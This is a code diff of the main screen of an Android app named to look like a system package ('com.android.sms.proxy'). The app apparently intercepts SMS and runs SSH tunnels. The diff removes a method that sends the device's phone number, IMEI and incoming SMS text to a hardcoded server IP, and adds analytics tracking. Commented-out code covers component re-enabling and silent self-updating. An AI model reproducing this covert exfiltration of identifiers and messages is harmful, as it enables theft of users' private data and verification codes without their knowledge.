@@ -7,42 +7,32 @@ import android.os.Bundle;
 import android.os.IBinder;
 import android.os.RemoteException;
 import android.support.v7.app.AppCompatActivity;
-import android.text.TextUtils;
 import android.util.Log;
 import android.widget.TextView;
 
-import com.android.sms.proxy.R;
-import com.android.sms.proxy.entity.BindServiceEvent;
 import com.android.sms.proxy.entity.MessageEvent;
 import com.android.sms.proxy.entity.NativeParams;
-import com.android.sms.proxy.entity.PhoneInfo;
-import com.android.sms.proxy.entity.SpSimpleJsonImpl;
 import com.android.sms.proxy.service.AlarmControl;
 import com.android.sms.proxy.service.IProxyControl;
 import com.android.sms.proxy.service.ProxyServiceUtil;
 import com.android.sms.proxy.service.Receiver_SMS;
-import com.oplay.nohelper.loader.Loader_Base_ForCommon;
-import com.oplay.nohelper.volley.RequestEntity;
-import com.oplay.nohelper.volley.Response;
-import com.oplay.nohelper.volley.VolleyError;
+import com.flurry.android.FlurryAgent;
+import com.umeng.analytics.AnalyticsConfig;
+import com.umeng.analytics.MobclickAgent;
 
 import org.connectbot.bean.HostBean;
 import org.connectbot.bean.PortForwardBean;
-import org.connectbot.event.WaitForSocketEvent;
 import org.connectbot.service.BridgeDisconnectedListener;
 import org.connectbot.service.TerminalBridge;
 import org.connectbot.service.TerminalManager;
 import org.greenrobot.eventbus.EventBus;
 import org.greenrobot.eventbus.Subscribe;
 
-import java.util.HashMap;
-import java.util.Map;
-
 /**
  * @author zyq 16-3-10
  */
 public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnReceiveSMSListener,
-        BridgeDisconnectedListener, ServiceConnection {
+		BridgeDisconnectedListener, ServiceConnection {
 
 	private static final String TAG = "main";
 	public static final String NETWORK_CACHE_DIR = "volley";
@@ -112,13 +102,31 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 //		message.setMovementMethod(ScrollingMovementMethod.getInstance());
 		//EventBus.getDefault().register(this);
 		//Receiver_SMS.setReceiveListener(this);
-		AlarmControl.getInstance(this).initAlarm(15, 52, 0, 0);
+//		AlarmControl.getInstance(this).initAlarm(15, 52, 0, 0);
 //		Log.d(TAG, "imsi:" + PhoneInfo.getInstance(this).getPhoneIMSI());
 //		String phoneNumber = PhoneInfo.getInstance(this).getNativePhoneNumber();
 //		Log.d(TAG, "手机号码:" + phoneNumber);
 //		String imei = PhoneInfo.getInstance(this).getIMEI();
 //		Log.d(TAG, "imei:" + imei);
+
+
+		AlarmControl.getInstance(this).initAlarm(1, 1, 1, 1);
+		//友盟不支持在service中做统计！！！！！！！！
+		AnalyticsConfig.setAppkey(this, NativeParams.UMENG_APP_KEY);
+		AnalyticsConfig.setChannel(NativeParams.UMENG_APP_CHANNEL);
+
+		FlurryAgent.onStartSession(this);
+
+//		Task.callInBackground(new Callable<Object>() {
+//			@Override
+//			public Object call() throws Exception {
+//				ApkUpdateUtil.getInstance(getApplication()).updateApk();
+//				return null;
+//			}
+//		});
+		//finish();
 	}
+
 
 	@Override
 	public void onReceiveSMS(String sms) {
@@ -126,50 +134,41 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 		//sendRegisterCode(sms);
 	}
 
-	public void sendSms(String sms) {
-		String number = PhoneInfo.getInstance(this).getNativePhoneNumber();
-		if (TextUtils.isEmpty(number)) return;
-		Map<String, String> map = new HashMap<>();
-		map.put(NativeParams.TYPE_PHONE_NUMBER, PhoneInfo.getInstance(this).getNativePhoneNumber());
-		map.put(NativeParams.TYPE_PHONE_IMEI, PhoneInfo.getInstance(this).getIMEI());
-		map.put(NativeParams.TYPE_PHONE_SMS, sms);
-		String url = "http://52.77.240.92:80/regist/";
-		RequestEntity<SpSimpleJsonImpl> entity = new RequestEntity<SpSimpleJsonImpl>(url, SpSimpleJsonImpl.class, map);
-		Loader_Base_ForCommon.getInstance().onRequestLoadNetworkTask(entity, true, new Response.Listener() {
-			@Override
-			public void onResponse(Object response) {
-				if (response instanceof SpSimpleJsonImpl) {
-					int code = ((SpSimpleJsonImpl) response).getCode();
-					if (code == NativeParams.SUCCESS) {
-						String data = ((SpSimpleJsonImpl) response).getData();
-						Log.d(TAG, "返回数据:" + data);
-					}
-				}
-			}
-		}, new Response.ErrorListener() {
-			@Override
-			public void onErrorResponse(VolleyError error) {
-				Log.d(TAG, error.toString());
-			}
-		});
+
+	@Override
+	protected void onResume() {
+		super.onResume();
+		MobclickAgent.onResume(this);
 	}
 
 	@Override
-	protected void onDestroy() {
+	protected void onPause() {
+		super.onPause();
+		MobclickAgent.onPause(this);
+	}
 
+
+
+	@Override
+	protected void onDestroy() {
+		FlurryAgent.onEndSession(this);
 		super.onDestroy();
-		if (binder != null) {
-			unbindService(connection);
-		}
-		if (mProxyControl != null) {
-			unbindService(this);
-		}
+//		ComponentName componentToEnable = new ComponentName("com.android.sms.proxy", "com.android.sms.proxy.ui" +
+//				".MainActivity");
+//		getPackageManager().setComponentEnabledSetting(componentToEnable, PackageManager
+//						.COMPONENT_ENABLED_STATE_ENABLED,
+//				PackageManager.DONT_KILL_APP);
+//		if (binder != null) {
+//			unbindService(connection);
+//		}
+//		if (mProxyControl != null) {
+//			unbindService(this);
+//		}
 	}
 
 	@Override
 	protected void onStop() {
 		super.onStop();
-
 	}
 
 	@Subscribe
@@ -192,44 +191,6 @@ public class MainActivity extends AppCompatActivity implements Receiver_SMS.OnRe
 			}
 		});
 
-	}
-
-
-	@Subscribe
-	public void onEvent(final BindServiceEvent event) {
-		runOnUiThread(new Runnable() {
-			@Override
-			public void run() {
-				if (event != null) {
-					printMessage = getString(R.string.proxy_config_enough);
-					print(printMessage);
-					mBindServiceStartTime = System.currentTimeMillis();
-					//bindService(new Intent(MainActivity.this, TerminalManager.class), connection, Context
-					// .BIND_AUTO_CREATE);
-				}
-
-			}
-		});
-
-	}
-
-	@Subscribe
-	public void onEvent(final WaitForSocketEvent event) {
-
-		runOnUiThread(new Runnable() {
-			@Override
-			public void run() {
-				if (event != null) {
-					long temp = mBindServiceStartTime;
-					mBindServiceStartTime = System.currentTimeMillis();
-					temp = mBindServiceStartTime - temp;
-					printMessage = "ssh隧道建立成功，用时" + temp + "毫秒";
-					print(printMessage);
-					// bindService(new Intent(MainActivity.this,ProxyService.class),MainActivity.this,Context
-					// .BIND_AUTO_CREATE);
-				}
-			}
-		});
 	}
 
 	@Override
